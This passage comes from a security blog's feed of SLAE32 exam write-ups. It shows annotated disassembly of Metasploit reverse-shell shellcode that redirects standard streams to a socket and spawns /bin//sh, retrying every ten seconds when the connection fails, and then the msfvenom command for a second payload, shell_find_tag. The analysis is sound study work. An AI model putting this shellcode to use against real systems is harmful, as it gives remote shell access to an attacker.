&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; clear EAX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000005&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of dup2(): stderr&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000061&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;41&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of dup2(): the IPv6 socket&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000062&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;00000064&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B03F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000066&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Redirect &lt;code&gt;stderr&lt;/code&gt; to the previously-created socket
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;So far the disassembly I analysed is equal to the following C code:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Next, a shell is spawned.&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; clear EDX and EAX&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of execve(): envp&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   array of pointers to strings (env. variables)&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; in this case it's a null pointer&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000068&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D2&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000006&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;F7E2&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push a string to the stack and add 4 null bytes at the end&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   string: /bin//sh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000006&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000006&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F2F7368&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f2f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000072&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F62696E&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6e69622f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of execve(): pathname, a pointer to the&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   executable to run&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000077&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; array of pointers to command-line arguments&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   - EBX -&amp;gt; &quot;/bin//sh&quot;&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   - EDX -&amp;gt; 0x00000000 &lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000079&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;52&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000007&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of execve(): argv&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   array of pointers to strings (command-line arguments)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000007&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call execve() syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000007&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B00B&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000007&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As for the second assignment, once the shellcode correctly redirected &lt;code&gt;stdin&lt;/code&gt;, &lt;code&gt;stdout&lt;/code&gt;, and &lt;code&gt;stderr&lt;/code&gt; to the file descriptor of the server socket (a Metasploit handler to be specific), it uses &lt;code&gt;execve&lt;/code&gt; to spawn the reverse shell.&lt;/p&gt;
&lt;p&gt;In this case it uses the shell &lt;code&gt;/bin//sh&lt;/code&gt;, as the string occupies only &lt;code&gt;8 bytes&lt;/code&gt;, but we could also replace it with &lt;code&gt;/bin/bash&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If the shellcode can't connect to the remote server, then it jumps to the address &lt;code&gt;00000082&lt;/code&gt;, which is the start of a block of assembly instructions that call the syscall &lt;code&gt;nanosleep()&lt;/code&gt; in order to sleep for &lt;code&gt;10&lt;/code&gt; seconds:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; I don't know why the use of this instruction.&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; Once the shellcode spawns a shell, the code of the program&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; should be replace, so it seems useless&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000081&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;C3&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;ret&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear EBX and push 0x00000000 to the stack&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000082&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000084&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;  

                            &lt;span class=&quot;c1&quot;&gt;; push the DWORD 0x0000000a to the stack&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000085&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A0A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear EAX and EDX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000087&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;F7E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of nanosleep():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   pointer to a timespec structure&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000089&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call nanosleep()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000008&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B0A2&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa2&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000008&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The interesting fact about &lt;code&gt;nanosleep&lt;/code&gt; is that it doesn't simply use a integer to determine how many seconds/nanoseconds to sleep, but it uses a &lt;code&gt;struct&lt;/code&gt;. According to the &lt;a href=&quot;https://man7.org/linux/man-pages/man2/nanosleep.2.html&quot;&gt;Linux manual&lt;/a&gt;, it is structured as follows:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;timespec&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;time_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tv_sec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;cm&quot;&gt;/* seconds */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;tv_nsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;cm&quot;&gt;/* nanoseconds */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Based on a few files of the Linux kernel, the size of &lt;code&gt;time_t&lt;/code&gt; should be &lt;code&gt;4 bytes&lt;/code&gt; on 32-bit &lt;code&gt;x86&lt;/code&gt; systems, same for the &lt;code&gt;long&lt;/code&gt; type. So we're looking at a struct made out of &lt;code&gt;8 bytes&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The first 4 bytes specify the number of &lt;code&gt;seconds&lt;/code&gt; to sleep, while the other ones specify the number of &lt;code&gt;nanoseconds&lt;/code&gt; to sleep.&lt;/p&gt;
&lt;p&gt;Since the &lt;code&gt;stack&lt;/code&gt; grows downward, we have to push the value of &lt;code&gt;tv_nsec&lt;/code&gt; to the stack first, and then push the value of &lt;code&gt;tv_sec&lt;/code&gt;. Let's look again at the struct:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; clear EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000082&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push the value of `tv_nsec` to the stack&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; sleep 0 nanoseconds&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000084&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;  

                            &lt;span class=&quot;c1&quot;&gt;; push the value of `tv_sec` to the stack&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; sleep 10 seconds&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000085&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A0A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear EAX and EDX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000087&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;F7E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of nanosleep():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   pointer to a timespec structure&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000089&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once the shellcode sleeps &lt;code&gt;10 seconds&lt;/code&gt;, it goes back attempting to connect to the remote server (address &lt;code&gt;00000014&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; go back to 00000014 (to connect to the remote server)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000008&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;E980FFFFFF&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; apparently, this instruction is never going to be executed &lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000094&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;C3&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;ret&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Finally, there are some instructions that call the syscall &lt;code&gt;exit()&lt;/code&gt;, in order to exit gracefully.&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; call exit() syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000095&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000097&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B001&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000099&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;From what it seems, this last syscall is never executed. In fact, there are only two possibilities:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;executes &lt;code&gt;/bin//sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;loops forever, sleeping &lt;code&gt;10 seconds&lt;/code&gt; and trying to connect to the remote server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Perhaps these instructions were added for conformitiy with other Linux executable, as a way not to &lt;em&gt;stand out&lt;/em&gt;.&lt;/p&gt;
</description>
        <pubDate>Sat, 25 Dec 2021 00:00:00 +0100</pubDate>
        <link>/21/12/25/slae32-assignment-5_4</link>
        <guid isPermaLink="true">/21/12/25/slae32-assignment-5_4</guid>
        
        <category>slae</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>x86</category>
        
        <category>metasploit</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #5 Part 3</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays &lt;code&gt;msfvenom&lt;/code&gt;) for 32-bit Linux systems.&lt;/p&gt;
&lt;p&gt;Programs like &lt;code&gt;gdb&lt;/code&gt;/&lt;code&gt;ndisasm&lt;/code&gt;/&lt;code&gt;libemu&lt;/code&gt; can be used for dissecting the shellcode and performing the analysis.&lt;/p&gt;
&lt;p&gt;I chose the following 4 shellcode samples:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/adduser&lt;/td&gt;
&lt;td&gt;Create a new user with UID 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell/reverse_nonx_tcp&lt;/td&gt;
&lt;td&gt;Spawn a command shell (staged). Connect back to the attacker&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_find_tag&lt;/td&gt;
&lt;td&gt;Spawn a shell on an established connection (proxy/nat safe)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_reverse_tcp_ipv6&lt;/td&gt;
&lt;td&gt;Connect back to attacker and spawn a command shell over IPv6&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;In this post I'll analyse &lt;code&gt;linux/x86/shell_find_tag&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;source-code&quot;&gt;Source code&lt;/h2&gt;
&lt;p&gt;The full source code is stored inside the repository created for this Exam: &lt;a href=&quot;https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/5/part/3&quot;&gt;rbctee/SlaeExam&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;List of files:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/mimick_shellcode.c&quot;&gt;mimick_shellcode.c&lt;/a&gt;, a C program that I've written to imitate the instructions ran by the shellcode&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/run_shellcode.c&quot;&gt;run_shellcode.c&lt;/a&gt;, a C program that runs the shellcode analysed in this post&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;h3 id=&quot;ndisasm&quot;&gt;NDISASM&lt;/h3&gt;
&lt;p&gt;To generate the payload:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell_find_tag &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To analyse it with &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ndisasm shellcode.bin &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It returns the following output (comments are mine though):&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; clear EBX and push 0x00000000 to the stack&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; store pointer to 0x00000000 into ESI&lt;/span&gt;
